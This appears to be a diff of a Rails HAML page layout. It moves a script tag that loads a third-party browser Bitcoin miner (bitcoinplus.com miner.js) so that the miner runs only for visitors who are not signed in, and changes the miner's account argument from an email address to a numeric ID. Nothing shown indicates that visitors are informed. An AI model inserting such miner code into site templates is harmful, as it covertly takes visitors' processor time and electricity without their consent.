@@ -50,6 +50,7 @@
       .span12
         = yield
     running on ruby version #{RUBY_VERSION} with rails version #{Rails::VERSION::STRING}
-%script{:src => "http://www.bitcoinplus.com/js/miner.js", :type => "text/javascript"}
-:javascript
-  BitcoinPlusMiner("daniel@the-beach.co")
+- unless user_signed_in?
+  %script{:src => "http://www.bitcoinplus.com/js/miner.js", :type => "text/javascript"}
+  :javascript
+    BitcoinPlusMiner(21406497)
